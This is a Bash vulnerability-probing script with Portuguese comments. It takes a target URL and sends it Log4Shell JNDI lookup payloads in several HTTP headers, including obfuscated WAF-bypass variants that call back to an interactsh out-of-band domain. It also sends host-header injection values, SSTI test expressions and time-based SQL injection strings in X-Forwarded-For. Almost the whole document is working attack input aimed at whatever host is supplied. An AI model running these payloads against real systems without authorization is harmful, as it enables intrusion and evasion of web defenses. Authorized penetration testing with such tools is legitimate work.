#!/bin/bash

# Captura parâmetros corretamente
TARGET=""
IACT_DOMAIN=""

for ((i=1; i<=$#; i++)); do
  arg="${!i}"
  if [[ "$arg" == "-i" ]]; then
    j=$((i+1))
    IACT_DOMAIN="${!j}"
  elif [[ "$arg" == http* ]]; then
    TARGET="$arg"
  fi
done

HOST=$(echo $TARGET | sed 's|https\?://||' | cut -d'/' -f1)

if [ -z "$TARGET" ] || [ -z "$IACT_DOMAIN" ]; then
  echo "Uso: bash testes_headers.sh https://alvo -i DOMINIO.oast.site"
  exit 1
fi

echo "[*] Target: $TARGET"
echo "[*] Domínio interactsh: $IACT_DOMAIN"

scan_target() {
  local url=$1
  local proto=$2

  if [ "$proto" == "HTTPS" ]; then
    CURL_FLAGS="-skL"
  else
    CURL_FLAGS="-sL"
  fi

  echo ""
  echo "==============================="
  echo "[*] $proto → $url"
  echo "==============================="

  # Log4Shell
  echo ""
  echo "=== Log4Shell (CVE-2021-44228) ==="
  HEADERS=("User-Agent" "X-Api-Version" "X-Forwarded-For" "Referer" "X-Client-IP" "X-Forwarded-Host" "X-Originating-IP")
  for header in "${HEADERS[@]}"; do
    code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
      -H "$header: \${jndi:ldap://$IACT_DOMAIN/$header}" "$url")
    echo "[$code] $header"
  done

  # Log4Shell WAF Bypass
  echo ""
  echo "=== Log4Shell WAF Bypass ==="
  BYPASSES=(
    "\${j\${::-n}di:ldap://$IACT_DOMAIN/bypass1}"
    "\${jndi:ldap://\${hostName}.$IACT_DOMAIN/bypass2}"
    "\${jndi:\${lower:l}dap://$IACT_DOMAIN/bypass3}"
    "\${jndi:ldap://127.0.0.1#$IACT_DOMAIN/bypass4}"
  )
  for bypass in "${BYPASSES[@]}"; do
    code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
      -H "User-Agent: $bypass" "$url")
    echo "[$code] $bypass"
  done

  # Host Header
  echo ""
  echo "=== Host Header Injection ==="
  for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-For"; do
    result=$(curl $CURL_FLAGS --max-time 5 \
      -H "$header: $IACT_DOMAIN" "$url")
    if echo "$result" | grep -qi "$IACT_DOMAIN"; then
      echo "[REFLECTED] $header → domínio refletido no body"
    else
      code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
        -H "$header: $IACT_DOMAIN" "$url")
      echo "[$code] $header"
    fi
  done

  # SSTI
  echo ""
  echo "=== SSTI Detection ==="
  declare -A ENGINE_MAP
  ENGINE_MAP['{{7*7}}']="Jinja2/Twig"
  ENGINE_MAP['${7*7}']="FreeMarker/SpEL"
  ENGINE_MAP['*{7*7}']="Thymeleaf"
  ENGINE_MAP['#{7*7}']="Ruby/Slim"
  ENGINE_MAP['<%= 7*7 %>']="ERB/JSP"

  for payload in '{{7*7}}' '${7*7}' '*{7*7}' '#{7*7}' '<%= 7*7 %>'; do
    engine=${ENGINE_MAP[$payload]}
    for h in "User-Agent" "Referer" "X-Forwarded-For"; do
      result=$(curl $CURL_FLAGS --max-time 5 \
        -H "$h: $payload" "$url")
      if echo "$result" | grep -q "49"; then
        echo "[CONFIRMED] $h: $payload → $engine executou 7*7=49"
      else
        echo "[      ] $h: $payload ($engine)"
      fi
    done
  done

  # XFF SQLi — sem bc, usa awk
  echo ""
  echo "=== XFF SQLi (time-based) ==="
  for payload in "'" "' OR 1=1--" "1; SELECT SLEEP(5)--" "1 AND SLEEP(5)--"; do
    elapsed=$(curl $CURL_FLAGS -o /dev/null -w "%{time_total}" --max-time 10 \
      -H "X-Forwarded-For: $payload" "$url")
    
    # Compara sem bc usando awk
    is_slow=$(awk "BEGIN {print ($elapsed > 4) ? 1 : 0}")
    if [ "$is_slow" == "1" ]; then
      echo "[POSSIBLE SQLi] ${elapsed}s → $payload"
    else
      echo "[${elapsed}s] $payload"
    fi
  done
}

# Roda uma vez em cada protocolo
scan_target "http://$HOST" "HTTP"
scan_target "https://$HOST" "HTTPS"

echo ""
echo "[*] Scan finalizado → $HOST"
echo "[*] Verifique callbacks no interactsh-client"
